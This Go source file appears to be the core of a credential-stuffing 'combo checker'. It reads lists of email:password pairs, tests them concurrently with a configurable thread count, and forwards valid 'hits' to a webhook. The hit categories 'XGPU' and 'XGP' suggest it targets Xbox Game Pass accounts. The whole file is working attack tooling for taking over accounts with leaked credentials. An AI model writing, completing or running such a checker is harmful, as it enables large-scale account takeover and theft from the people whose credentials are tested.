package main

import (
	"bufio"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// CheckerState tracks the global checker lifecycle.
type CheckerState struct {
	mu        sync.Mutex
	running   int32 // atomic: 1 = running, 0 = idle
	cancel    chan struct{}
	startTime time.Time
	doneCh    chan struct{}
}

var checker = &CheckerState{}

// IsRunning returns true if the checker is currently active.
func (cs *CheckerState) IsRunning() bool {
	return atomic.LoadInt32(&cs.running) == 1
}

// StartCheck launches the checker with the given combos and thread count.
// Returns false if a check is already in progress.
func (cs *CheckerState) StartCheck(cfg *Config, rawCombos string, threads int) bool {
	cs.mu.Lock()
	defer cs.mu.Unlock()

	if atomic.LoadInt32(&cs.running) == 1 {
		return false
	}

	// Parse combos
	var combos []string
	seen := make(map[string]bool)
	scanner := bufio.NewScanner(strings.NewReader(rawCombos))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || !strings.Contains(line, ":") {
			continue
		}
		if !seen[line] {
			seen[line] = true
			combos = append(combos, line)
		}
	}

	if len(combos) == 0 {
		return false
	}

	// Reset stats
	gStats.Reset(int64(len(combos)))

	// Set results directory named after timestamp
	EnsureResultDir(time.Now().Format("2006-01-02_15-04-05"))

	cs.cancel = make(chan struct{})
	cs.doneCh = make(chan struct{})
	cs.startTime = time.Now()
	atomic.StoreInt32(&cs.running, 1)

	go cs.run(cfg, combos, threads)
	return true
}

// Stop signals the checker to stop.
func (cs *CheckerState) Stop() (elapsed time.Duration) {
	cs.mu.Lock()

	if atomic.LoadInt32(&cs.running) == 0 {
		cs.mu.Unlock()
		return 0
	}
	close(cs.cancel)
	start := cs.startTime
	doneCh := cs.doneCh
	cs.mu.Unlock()

	// Wait for goroutines (with timeout)
	select {
	case <-doneCh:
	case <-time.After(5 * time.Second):
	}

	return time.Since(start)
}

// Elapsed returns time since the checker started.
func (cs *CheckerState) Elapsed() time.Duration {
	cs.mu.Lock()
	defer cs.mu.Unlock()
	if atomic.LoadInt32(&cs.running) == 0 {
		return 0
	}
	return time.Since(cs.startTime)
}

func (cs *CheckerState) run(cfg *Config, combos []string, threads int) {
	defer func() {
		atomic.StoreInt32(&cs.running, 0)
		close(cs.doneCh)
	}()

	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, combo := range combos {
		select {
		case <-cs.cancel:
			break
		case sem <- struct{}{}:
		}

		wg.Add(1)
		go func(c string) {
			defer wg.Done()
			defer func() { <-sem }()

			// Check for cancellation
			select {
			case <-cs.cancel:
				return
			default:
			}

			parts := strings.SplitN(c, ":", 2)
			if len(parts) != 2 {
				incBad()
				return
			}
			email := strings.TrimSpace(parts[0])
			password := strings.TrimSpace(parts[1])

			if email == "" || password == "" || !strings.Contains(email, "@") {
				incBad()
				return
			}

			result := CheckCombo(cfg, email, password)

			if isHitType(result.Type) {
				sendHitWebhook(cfg, result)
			}
		}(combo)
	}

	wg.Wait()
}

func isHitType(t string) bool {
	switch t {
	case "Hit", "XGPU", "XGP", "Other":
		return true
	}
	return false
}
